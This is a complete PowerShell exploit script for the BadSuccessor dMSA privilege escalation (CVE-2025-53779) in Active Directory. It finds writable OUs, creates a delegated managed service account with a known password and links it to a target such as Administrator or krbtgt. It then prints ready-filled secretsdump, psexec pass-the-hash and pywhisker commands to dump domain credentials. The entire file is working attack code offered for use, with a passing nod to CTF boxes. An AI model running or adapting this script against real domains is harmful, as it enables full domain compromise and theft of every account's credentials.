#
# AutoBadSuccessor.ps1 :: CVE-2025-53779 dMSA privilege escalation
#
# BACKGROUND:
#   BadSuccessor abuses the dMSA migration feature in Windows Server 2025.
#   A dMSA linked to any account inherits that account's SIDs in its Kerberos PAC.
#   All you need is CreateChild on any OU common in 91% of tested domains.
#
# PREREQUISITE:
#   Domain must have at least one Windows Server 2025 DC (build >= 26100)
#   Current user must have CreateChild rights on at least one OU
#
# PATCH STATUS:
#   Vulnerable : Windows Server 2025 build < 26100.4946
#   Patched    : Windows Server 2025 build >= 26100.4946 (August 12 2025)
#   Not vuln   : Any domain with no Server 2025 DC
#
# USAGE:
# -----------------------------------------------
#   .\AutoBadSuccessor.ps1
#       Full auto — find OU, create dMSA, target Administrator
#
#   .\AutoBadSuccessor.ps1 -TargetSam krbtgt
#       Target krbtgt — gives DCSync-equivalent access
#
#   .\AutoBadSuccessor.ps1 -TargetSam "DA_user" -ForcedOU "OU=IT,DC=domain,DC=htb"
#       Target specific account using specific OU
#
#   .\AutoBadSuccessor.ps1 -Cleanup
#       Remove all dMSA objects created in previous runs (reads log)
#
# WHAT HAPPENS:
# -----------------------------------------------
#   1. Confirms Windows Server 2025 DC exists
#   2. Finds OUs where current user has CreateChild
#   3. Creates dMSA with known password
#   4. Sets msDS-ManagedAccountPrecededByLink -> target DN
#   5. Sets msDS-DelegatedMSAState -> 2 (migration complete)
#   6. Verifies attributes set correctly
#   7. Outputs Kali commands with all values pre-filled
#
# KALI COMMANDS (auto-generated with values filled in after run):
# -----------------------------------------------
#   # Direct secretsdump — dMSA PAC contains predecessor SIDs (DA rights):
#   python3 secretsdump.py '<domain>/<dmsa>$:<password>@<DC_IP>'
#
#   # Or TGT first:
#   python3 getTGT.py '<domain>/<dmsa>$:<password>' -dc-ip <DC_IP>
#   export KRB5CCNAME=<dmsa>.ccache
#   python3 secretsdump.py -k -no-pass '<domain>/<dmsa>$@<DC_FQDN>'
#
# LOG:
#   .\AutoBadSuccessor.log — stores created dMSA DNs for cleanup
#

param(
    [switch]$Cleanup,
    [string]$TargetSam  = 'Administrator',
    [string]$ForcedOU   = '',
    [string]$CustomName = ''
)

$ErrorActionPreference = 'SilentlyContinue'
Set-StrictMode -Off

$LOG_FILE = Join-Path $PSScriptRoot 'AutoBadSuccessor.log'

function Write-Ok   { param($m) Write-Host "[+] $m" -ForegroundColor Green    }
function Write-Fail { param($m) Write-Host "[-] $m" -ForegroundColor Red      }
function Write-Warn { param($m) Write-Host "[!] $m" -ForegroundColor Yellow   }
function Write-Info { param($m) Write-Host "[*] $m" -ForegroundColor DarkGray }
function Write-Hit  { param($m) Write-Host "[>] $m" -ForegroundColor Cyan     }

function Get-DomainCtx {
    try {
        $root  = [System.DirectoryServices.DirectoryEntry]::new()
        $dn    = $root.Properties['distinguishedName'].Value
        $dns   = ($dn -split ',' | Where-Object { $_ -match '^DC=' } | ForEach-Object { ($_ -split '=')[1] }) -join '.'
        $dcObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner
        $dc    = $dcObj.Name
        $dcIP  = ([System.Net.Dns]::GetHostAddresses($dc) |
                   Where-Object { $_.AddressFamily -eq 'InterNetwork' } |
                   Select-Object -First 1).IPAddressToString
        return @{ DN=$dn; DNS=$dns; DC=$dc; DCIP=$dcIP }
    } catch {
        Write-Fail "Domain bind failed: $_"
        return $null
    }
}

function Get-DCVersions {
    $s = [System.DirectoryServices.DirectorySearcher]::new()
    $s.Filter   = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
    $s.PageSize = 100
    [void]$s.PropertiesToLoad.Add("dNSHostName")
    [void]$s.PropertiesToLoad.Add("operatingSystem")
    [void]$s.PropertiesToLoad.Add("operatingSystemVersion")
    $out = [System.Collections.Generic.List[PSCustomObject]]::new()
    foreach ($r in $s.FindAll()) {
        $ver   = "$($r.Properties['operatingSystemversion'])"
        $build = 0
        if ($ver -match '\((\d+)\)') { $build = [int]$Matches[1] }
        $out.Add([PSCustomObject]@{
            Name   = "$($r.Properties['dnshostname'])"
            OS     = "$($r.Properties['operatingsystem'])"
            Build  = $build
            Is2025 = ($build -ge 26100)
        })
    }
    return $out
}

function Get-WritableOUs {
    $id     = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $mySIDs = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
    [void]$mySIDs.Add($id.User.Value)
    foreach ($g in $id.Groups) { try { [void]$mySIDs.Add($g.Value) } catch {} }

    $s = [System.DirectoryServices.DirectorySearcher]::new()
    $s.Filter   = "(|(objectClass=organizationalUnit)(cn=Managed Service Accounts)(cn=Computers))"
    $s.PageSize = 1000
    [void]$s.PropertiesToLoad.Add("distinguishedName")
    [void]$s.PropertiesToLoad.Add("name")

    $writable = [System.Collections.Generic.List[PSCustomObject]]::new()

    foreach ($r in $s.FindAll()) {
        $dn   = "$($r.Properties['distinguishedname'])"
        $name = "$($r.Properties['name'])"
        try {
            $entry = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$dn")
            $acl   = $entry.ObjectSecurity
            foreach ($rule in $acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {
                if ($rule.AccessControlType -ne 'Allow') { continue }
                if (-not $mySIDs.Contains($rule.IdentityReference.Value)) { continue }
                $rights = [int]$rule.ActiveDirectoryRights
                $CREATE_CHILD = 1
                $GENERIC_ALL  = 0x000F01FF
                $WRITE_DAC    = 0x00040000
                $WRITE_OWNER  = 0x00080000
                if (($rights -band $CREATE_CHILD) -or
                    ($rights -band $GENERIC_ALL)  -or
                    ($rights -band $WRITE_DAC)    -or
                    ($rights -band $WRITE_OWNER)) {
                    $writable.Add([PSCustomObject]@{ DN=$dn; Name=$name })
                    break
                }
            }
        } catch {}
    }
    return $writable
}

function Get-TargetAccount {
    param([string]$Sam)
    $s = [System.DirectoryServices.DirectorySearcher]::new()
    $s.Filter = "(sAMAccountName=$Sam)"
    [void]$s.PropertiesToLoad.Add("distinguishedName")
    [void]$s.PropertiesToLoad.Add("objectSid")
    $r = $s.FindOne()
    if (-not $r) { return $null }
    $sid = $null
    try { $sid = [System.Security.Principal.SecurityIdentifier]::new($r.Properties['objectsid'][0], 0) } catch {}
    return @{ DN="$($r.Properties['distinguishedname'])"; SID=$sid }
}

function New-DMSA {
    param([string]$OuDN, [string]$Name, [string]$Password)
    try {
        $ou   = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$OuDN")
        $dmsa = $ou.Children.Add("CN=$Name", "msDS-DelegatedManagedServiceAccount")
        $dmsa.Properties["sAMAccountName"].Value        = "$Name$"
        $dmsa.Properties["userAccountControl"].Value    = 4096
        $dmsa.Properties["dNSHostName"].Value           = "$Name.$($([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name))"
        $dmsa.CommitChanges()

        $pwdOk = $false

        try {
            $dmsa.Invoke("SetPassword", $Password)
            $dmsa.Properties["pwdLastSet"].Value = -1
            $dmsa.CommitChanges()
            $pwdOk = $true
        } catch {
            try {
                $enc = [System.Text.Encoding]::Unicode.GetBytes('"' + $Password + '"')
                $dmsa.Properties["unicodePwd"].Value = $enc
                $dmsa.CommitChanges()
                $pwdOk = $true
            } catch {}
        }

        return @{ Entry=$dmsa; DN="CN=$Name,$OuDN"; PwdOk=$pwdOk }
    } catch {
        Write-Fail "dMSA creation: $_"
        return $null
    }
}

function Set-Migration {
    param($Entry, [string]$TargetDN)
    try {
        $Entry.Properties["msDS-ManagedAccountPrecededByLink"].Value = $TargetDN
        $Entry.Properties["msDS-DelegatedMSAState"].Value            = 2
        $Entry.CommitChanges()
        return $true
    } catch {
        Write-Fail "Migration attrs: $_"
        return $false
    }
}

function Verify-DMSA {
    param([string]$DN)
    try {
        $s = [System.DirectoryServices.DirectorySearcher]::new()
        $s.Filter = "(distinguishedName=$DN)"
        [void]$s.PropertiesToLoad.Add("sAMAccountName")
        [void]$s.PropertiesToLoad.Add("msDS-ManagedAccountPrecededByLink")
        [void]$s.PropertiesToLoad.Add("msDS-DelegatedMSAState")
        $r = $s.FindOne()
        if (-not $r) { return $null }
        return @{
            Sam      = "$($r.Properties['samaccountname'])"
            Preceded = "$($r.Properties['msds-managedaccountprecededbylink'])"
            State    = "$($r.Properties['msds-delegatedmsastate'])"
        }
    } catch { return $null }
}

function Invoke-Cleanup {
    if (-not (Test-Path $LOG_FILE)) { Write-Warn "No log: $LOG_FILE"; return }
    $lines = Get-Content $LOG_FILE | Where-Object { $_ -match '\S' }
    if (-not $lines) { Write-Warn "Log empty."; return }
    $ok = 0; $fail = 0
    foreach ($dn in $lines) {
        try {
            $entry  = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$dn")
            $parent = $entry.Parent
            $parent.Children.Remove($entry)
            $parent.CommitChanges()
            Write-Ok "Removed: $dn"
            $ok++
        } catch {
            Write-Fail "Could not remove: $dn"
            $fail++
        }
    }
    Remove-Item $LOG_FILE -Force -ErrorAction SilentlyContinue
    Write-Host ""
    Write-Info "Cleanup — Removed:$ok  Failed:$fail"
}

# ─── MAIN ───────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "=== AutoBadSuccessor ===" -ForegroundColor Cyan
Write-Host "    CVE-2025-53779 | dMSA Privilege Escalation" -ForegroundColor DarkGray
Write-Host ""

if ($Cleanup) { Invoke-Cleanup; exit 0 }

$ctx = Get-DomainCtx
if (-not $ctx) { exit 1 }
Write-Ok "Domain : $($ctx.DNS)"
Write-Ok "DC     : $($ctx.DC) [$($ctx.DCIP)]"
Write-Host ""

Write-Info "Checking DC versions..."
$dcs    = Get-DCVersions
$vuln   = $dcs | Where-Object { $_.Is2025 }

foreach ($dc in $dcs) {
    if ($dc.Is2025) {
        Write-Host "  [Server 2025 BUILD:$($dc.Build)] $($dc.Name)" -ForegroundColor Yellow
    } else {
        Write-Host "  [Not 2025 - $($dc.Build)] $($dc.Name)" -ForegroundColor DarkGray
    }
}

Write-Host ""

if (-not $vuln) {
    Write-Fail "No Windows Server 2025 DCs found — BadSuccessor not applicable"
    exit 1
}

$dc2025Build = ($vuln | Select-Object -First 1).Build
if ($dc2025Build -ge 26100) {
    Write-Warn "Build $dc2025Build detected — if < 26100.4946 this is fully exploitable"
    Write-Warn "Patch (CVE-2025-53779) deployed Aug 12 2025 — CTF boxes are likely unpatched"
}
Write-Host ""

Write-Info "Finding writable OUs..."
$ous = if ($ForcedOU) {
    @([PSCustomObject]@{
        DN   = $ForcedOU
        Name = (($ForcedOU -split ',')[0] -split '=')[1]
    })
} else {
    Get-WritableOUs
}

if (-not $ous -or $ous.Count -eq 0) {
    Write-Fail "No writable OUs — current user lacks CreateChild anywhere"
    exit 1
}

Write-Ok "Writable containers: $($ous.Count)"
$ous | ForEach-Object { Write-Host "  $($_.DN)" -ForegroundColor DarkGray }
Write-Host ""

Write-Info "Resolving target: $TargetSam"
$target = Get-TargetAccount $TargetSam
if (-not $target) {
    Write-Fail "Target account not found: $TargetSam"
    exit 1
}
Write-Ok "Target DN  : $($target.DN)"
Write-Ok "Target SID : $($target.SID)"
Write-Host ""

$dmsaName = if ($CustomName) { $CustomName } else {
    'svc' + ([System.IO.Path]::GetRandomFileName().Replace('.','').Substring(0,6))
}
$dmsaPass = 'B@dSuc' + [System.IO.Path]::GetRandomFileName().Replace('.','').Substring(0,8) + '!'
$targetOU = $ous[0].DN

Write-Info "Creating dMSA..."
Write-Info "  Name     : $dmsaName"
Write-Info "  OU       : $targetOU"
Write-Info "  Password : $dmsaPass"
Write-Host ""

$created = New-DMSA $targetOU $dmsaName $dmsaPass
if (-not $created) {
    Write-Fail "dMSA creation failed — schema may not include msDS-DelegatedManagedServiceAccount"
    Write-Warn "Requires Server 2025 schema extension (adprep must have run)"
    exit 1
}

Write-Ok "dMSA created : $($created.DN)"
if ($created.PwdOk) {
    Write-Ok "Password set : $dmsaPass"
} else {
    Write-Warn "Password set failed — shadow credential path needed (see Kali commands)"
}

Write-Host ""
Write-Info "Setting migration attributes..."

$migOk = Set-Migration $created.Entry $target.DN
if (-not $migOk) { exit 1 }

Write-Ok "msDS-ManagedAccountPrecededByLink -> $($target.DN)"
Write-Ok "msDS-DelegatedMSAState           -> 2"

Write-Host ""
Write-Info "Verifying..."
Start-Sleep -Milliseconds 800

$v = Verify-DMSA $created.DN
if ($v -and $v.State -eq '2' -and $v.Preceded) {
    Write-Ok "Verified — attack setup complete"
    Write-Host "  SAM      : $($v.Sam)"      -ForegroundColor DarkGray
    Write-Host "  Preceded : $($v.Preceded)" -ForegroundColor DarkGray
    Write-Host "  State    : $($v.State)"    -ForegroundColor DarkGray
} else {
    Write-Warn "Verification failed — attributes may not have committed"
    Write-Warn "Try running Kali commands anyway — sometimes replication delay"
}

[System.IO.File]::AppendAllText($LOG_FILE, "$($created.DN)`n")

Write-Host ""
Write-Host "=== Kali Commands ===" -ForegroundColor Cyan
Write-Host ""

if ($created.PwdOk) {
    Write-Host "# Option A — Direct secretsdump (fastest)" -ForegroundColor DarkGray
    Write-Hit  "python3 secretsdump.py '$($ctx.DNS)/$($dmsaName)`$:$dmsaPass@$($ctx.DCIP)'"
    Write-Host ""
    Write-Host "# Option B — TGT then secretsdump" -ForegroundColor DarkGray
    Write-Hit  "python3 getTGT.py '$($ctx.DNS)/$($dmsaName)`$:$dmsaPass' -dc-ip $($ctx.DCIP)"
    Write-Hit  "export KRB5CCNAME=$($dmsaName).ccache"
    Write-Hit  "python3 secretsdump.py -k -no-pass '$($ctx.DNS)/$($dmsaName)`$@$($ctx.DC)'"
    Write-Host ""
    Write-Host "# Option C — netexec verify first" -ForegroundColor DarkGray
    Write-Hit  "netexec smb $($ctx.DCIP) -u '$($dmsaName)`$' -p '$dmsaPass' -d '$($ctx.DNS)'"
    Write-Host ""
    Write-Host "# Option D — PTH after getting DA hash" -ForegroundColor DarkGray
    Write-Hit  "python3 psexec.py -hashes :<NT_HASH_FROM_DUMP> '$($ctx.DNS)/Administrator@$($ctx.DCIP)'"
} else {
    Write-Host "# Password not set — shadow credential path" -ForegroundColor DarkGray
    Write-Hit  "python3 pywhisker.py -d '$($ctx.DNS)' -u '<user>' -p '<pass>' --target '$($dmsaName)`$' --action add --dc-ip $($ctx.DCIP)"
    Write-Hit  "# pywhisker outputs the exact gettgtpkinit.py command with cert — run it"
    Write-Hit  "export KRB5CCNAME=$($dmsaName).ccache"
    Write-Hit  "python3 secretsdump.py -k -no-pass '$($ctx.DNS)/$($dmsaName)`$@$($ctx.DC)'"
}

Write-Host ""
Write-Host "# Cleanup after" -ForegroundColor DarkGray
Write-Hit  ".\AutoBadSuccessor.ps1 -Cleanup"

Write-Host ""
Write-Host "=== Summary ===" -ForegroundColor Cyan
Write-Host "  Domain   : $($ctx.DNS)"
Write-Host "  DC       : $($ctx.DC) [$($ctx.DCIP)]"
Write-Host "  dMSA     : $($dmsaName)$"
Write-Host "  Password : $dmsaPass"
Write-Host "  Target   : $TargetSam"
Write-Host "  Preceded : $($target.DN)"
Write-Host "  Log      : $LOG_FILE"
Write-Host ""
